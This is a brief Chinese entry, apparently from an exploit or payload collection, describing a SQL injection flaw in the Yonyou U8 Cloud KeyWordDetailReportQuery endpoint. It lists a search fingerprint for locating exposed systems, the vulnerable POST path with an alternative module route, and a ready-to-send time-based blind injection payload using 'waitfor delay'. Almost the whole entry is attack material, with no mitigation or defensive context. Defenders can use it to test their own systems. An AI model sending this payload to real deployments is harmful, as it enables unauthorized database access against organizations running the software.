# 用友U8Cloud-KeyWordDetailReportQuery存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-U8-Cloud"`
- **请求**：`POST /service/~iufo/nc.itf.iufo.mobilereport.data.KeyWordDetailReportQuery HTTP/1.1`

**Payload**
```
{"reportType":"1';waitfor delay '0:0:3'-- ","keyword":[]}
或者用通用 ic 模块，当然 用友的路由把 service换成servlet也是可以的。
POST /service/~ic/nc.itf.iufo.mobilereport.data.KeyWordDetailReportQuery HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
{"reportType":"1';waitfor delay '0:0:3'-- ","keyword":[]}
```